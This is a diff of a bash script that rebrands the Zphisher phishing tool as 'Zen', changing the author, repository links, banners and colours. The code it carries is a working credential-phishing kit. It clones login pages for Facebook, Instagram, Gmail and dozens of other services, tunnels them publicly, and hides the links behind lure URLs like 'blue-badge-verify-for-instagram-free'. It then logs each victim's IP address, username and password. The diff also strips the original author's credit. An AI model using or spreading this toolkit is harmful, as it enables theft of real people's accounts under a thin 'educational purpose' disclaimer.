@@ -1,9 +1,9 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   Zen 	: 	Automated Phishing Tool
+##   Author 	: 	whydohumanssuck 
 ##   Version 	: 	2.3.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
+##   Github 	: 	https://github.com/whydohumanssuck/zen
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -76,7 +76,7 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
+##      Copyright (C) 2026  whydohumanssuck (https://github.com/htr-tech)
 ##
 
 ##   THANKS TO :
@@ -132,12 +132,12 @@ fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+	{ printf "\n\n%s\n\n" "${MAGENTA}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
 	exit 0
 }
 
 exit_on_signal_SIGTERM() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+	{ printf "\n\n%s\n\n" "${MAGENTA}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
 	exit 0
 }
 
@@ -164,9 +164,9 @@ kill_pid() {
 # Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+	relase_url='https://api.github.com/repos/whydohumanssuck/zen/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+	tarball_url="https://github.com/whydohumanssuck/zen/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
@@ -174,18 +174,18 @@ check_update(){
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+		--retry 3 --retry-delay 2 --location --output ".zen.tar.gz" "${tarball_url}"
 
-		if [[ -e ".zphisher.tar.gz" ]]; then
-			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
-			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .zphisher.tar.gz
+		if [[ -e ".zen.tar.gz" ]]; then
+			tar -xf .zen.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+			[ $? -ne 0 ] && { echo -e "\n\n${MAGENTA}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
+			rm -f .zen.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zen again\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
+			echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} Error occured while downloading."
 			{ reset_color; exit 1; }
 		fi
 	else
@@ -203,27 +203,28 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
-
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${MAGENTA}
+		${MAGENTA}  ███████╗███████╗███╗   ██╗
+		${MAGENTA}  ╚══██╔╝██╔════╝████╗  ██║
+		${MAGENTA}     ██║  █████╗  ██╔██╗ ██║
+		${MAGENTA}     ██║  ██╔══╝  ██║╚██╗██║
+		${MAGENTA}     ██║  ███████╗██║ ╚████║
+		${MAGENTA}     ╚═╝  ╚══════╝╚═╝  ╚═══╝
+		${CYAN}                  ${WHITE}v${__version__}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Created by whydohumanssuck${WHITE}
+		${YELLOW}[${WHITE}~${YELLOW}]${CYAN} Redesigned Edition${WHITE}
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+		${MAGENTA}  ██╗██╗${CYAN}     ███████╗███████╗
+		${MAGENTA}  ██║██║${CYAN}     ╚════██║██╔════╝
+		${MAGENTA}  ██║██║${CYAN}      █████╔╝███████╗
+		${MAGENTA}  ╚═╝██║${CYAN}     ██╔═══╝ ╚════██║
+		${MAGENTA}  ███████║${CYAN}    ███████╗███████║
+		${MAGENTA}  ╚══════╝${CYAN}    ╚══════╝╚══════╝${WHITE} v${__version__}
 	EOF
 }
 
@@ -263,7 +264,7 @@ dependencies() {
 				elif [[ $(command -v yum) ]]; then
 					sudo yum -y install "$pkg"
 				else
-					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
+					echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
 					{ reset_color; exit 1; }
 				fi
 			}
@@ -295,7 +296,7 @@ download() {
 		chmod +x .server/$output > /dev/null 2>&1
 		rm -rf "$file"
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
+		echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -341,7 +342,7 @@ install_localxpose() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	echo -e "${CYANBG}${BLACK} Thank you for using Zen. Have a good day.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -349,13 +350,14 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
-		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
+		${GREEN} Author   ${RED}:  ${MAGENTA}whydohumanssuck ${RED}[ ${CYAN}ZEN ${RED}]
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/whydohumanssuck/zen
+		${GREEN} Social   ${RED}:  ${CYAN}https://github.com/whydohumanssuck
+		${GREEN} Version  ${RED}:  ${MAGENTA}${__version__}
+		${GREEN} Based on ${RED}:  ${CYAN}htr-tech/zen (Original)
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
-		${CYAN}  This Tool is made for educational purpose 
+		${CYAN}  Zen - Redesigned phishing toolkit for educational purpose 
 		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
 		  any misuse of this toolkit ${RED}!${WHITE}
 		
@@ -364,11 +366,11 @@ about() {
 		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
 		  Yisus7u7
 
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+		${MAGENTA}[${WHITE}00${MAGENTA}]${CYAN} Main Menu     ${MAGENTA}[${WHITE}99${MAGENTA}]${CYAN} Exit
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${MAGENTA}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 	case $REPLY in 
 		99)
 			msg_exit;;
@@ -376,7 +378,7 @@ about() {
 			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
 			{ sleep 1; main_menu; };;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${MAGENTA}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; about; };;
 	esac
 }
@@ -384,28 +386,28 @@ about() {
 ## Choose custom port
 cusport() {
 	echo
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	read -n1 -p "${MAGENTA}[${WHITE}?${MAGENTA}]${CYAN} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
-		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+		read -n4 -p "${MAGENTA}[${WHITE}-${MAGENTA}]${CYAN} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
 		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
 			echo
 		else
-			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
+			echo -ne "\n\n${MAGENTA}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
 			{ sleep 2; clear; banner_small; cusport; }
 		fi		
 	else 
-		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
+		echo -ne "\n\n${MAGENTA}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
 	fi
 }
 
 ## Setup website and start php server
 setup_site() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+	echo -ne "\n${MAGENTA}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
@@ -413,8 +415,8 @@ setup_site() {
 capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
+	echo -ne "\n${MAGENTA}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
@@ -423,25 +425,25 @@ capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${MAGENTA}[${WHITE}-${MAGENTA}]${CYAN} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${MAGENTA}[${WHITE}-${MAGENTA}]${CYAN} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			echo -e "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			echo -e "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Login info Found !!"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
@@ -453,9 +455,9 @@ capture_data() {
 start_cloudflared() { 
 	rm .cld.log > /dev/null 2>&1 &
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+	echo -ne "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
@@ -475,11 +477,11 @@ localxpose_auth() {
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
 
 	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		echo -e "\n\n${MAGENTA}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
 		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		read -p "${MAGENTA}[${WHITE}-${MAGENTA}]${CYAN} Input Loclx Token :${ORANGE} " loclx_token
 		[[ $loclx_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+			echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
 		} || {
 			echo -n "$loclx_token" > $auth_f 2> /dev/null
 		}
@@ -489,12 +491,12 @@ localxpose_auth() {
 ## Start LocalXpose (Again...)
 start_loclx() {
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${MAGENTA}[${WHITE}?${MAGENTA}]${CYAN} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
-	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+	echo -e "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
@@ -511,10 +513,10 @@ start_loclx() {
 ## Start localhost
 start_localhost() {
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
@@ -523,13 +525,13 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
-		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${MAGENTA}[${WHITE}01${MAGENTA}]${CYAN} Localhost
+		${MAGENTA}[${WHITE}02${MAGENTA}]${CYAN} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
+		${MAGENTA}[${WHITE}03${MAGENTA}]${CYAN} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
+	read -p "${MAGENTA}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -539,7 +541,7 @@ tunnel_menu() {
 		3 | 03)
 			start_loclx;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${MAGENTA}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
 	esac
 }
@@ -547,16 +549,16 @@ tunnel_menu() {
 ## Custom Mask URL
 custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	read -n1 -p "${MAGENTA}[${WHITE}?${MAGENTA}]${CYAN} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
-		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+		echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
 		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
 			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
+			echo -e "\n${MAGENTA}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+			echo -e "\n${MAGENTA}[${WHITE}!${MAGENTA}]${CYAN} Invalid url type..Using the Default one.."
 		fi
 	fi
 }
@@ -599,23 +601,23 @@ custom_url() {
 		processed_url="Unable to Short URL"
 	fi
 
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
+	[[ $processed_url != *"Unable"* ]] && echo -e "\n${MAGENTA}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
 
 ## Facebook
 site_facebook() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
+		${MAGENTA}[${WHITE}01${MAGENTA}]${CYAN} Traditional Login Page
+		${MAGENTA}[${WHITE}02${MAGENTA}]${CYAN} Advanced Voting Poll Login Page
+		${MAGENTA}[${WHITE}03${MAGENTA}]${CYAN} Fake Security Login Page
+		${MAGENTA}[${WHITE}04${MAGENTA}]${CYAN} Facebook Messenger Login Page
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${MAGENTA}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -635,7 +637,7 @@ site_facebook() {
 			mask='https://get-messenger-premium-features-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${MAGENTA}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_facebook; };;
 	esac
 }
@@ -644,14 +646,14 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+		${MAGENTA}[${WHITE}01${MAGENTA}]${CYAN} Traditional Login Page
+		${MAGENTA}[${WHITE}02${MAGENTA}]${CYAN} Auto Followers Login Page
+		${MAGENTA}[${WHITE}03${MAGENTA}]${CYAN} 1000 Followers Login Page
+		${MAGENTA}[${WHITE}04${MAGENTA}]${CYAN} Blue Badge Verify Login Page
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${MAGENTA}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -671,7 +673,7 @@ site_instagram() {
 			mask='https://blue-badge-verify-for-instagram-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${MAGENTA}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_instagram; };;
 	esac
 }
@@ -680,13 +682,13 @@ site_instagram() {
 site_gmail() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+		${MAGENTA}[${WHITE}01${MAGENTA}]${CYAN} Gmail Old Login Page
+		${MAGENTA}[${WHITE}02${MAGENTA}]${CYAN} Gmail New Login Page
+		${MAGENTA}[${WHITE}03${MAGENTA}]${CYAN} Advanced Voting Poll
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${MAGENTA}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -702,7 +704,7 @@ site_gmail() {
 			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${MAGENTA}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_gmail; };;
 	esac
 }
@@ -711,12 +713,12 @@ site_gmail() {
 site_vk() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+		${MAGENTA}[${WHITE}01${MAGENTA}]${CYAN} Traditional Login Page
+		${MAGENTA}[${WHITE}02${MAGENTA}]${CYAN} Advanced Voting Poll Login Page
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${MAGENTA}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -728,7 +730,7 @@ site_vk() {
 			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${MAGENTA}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_vk; };;
 	esac
 }
@@ -737,26 +739,26 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${MAGENTA}[${WHITE}::${MAGENTA}]${CYAN} Select Target Platform ${MAGENTA}[${WHITE}::${MAGENTA}]${CYAN}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
-		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
-		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
-		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
-		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
-		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
-		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
-		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
